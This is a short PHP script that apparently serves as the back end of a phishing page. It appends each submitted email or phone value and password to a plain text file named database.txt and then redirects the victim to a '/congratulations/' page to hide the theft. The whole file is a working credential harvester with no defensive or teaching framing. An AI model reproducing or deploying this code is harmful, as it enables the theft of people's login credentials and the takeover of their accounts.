<?php

file_put_contents("database.txt",  " Phone Number: " . $_POST['email'] . " ,Password: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: /congratulations/');
exit();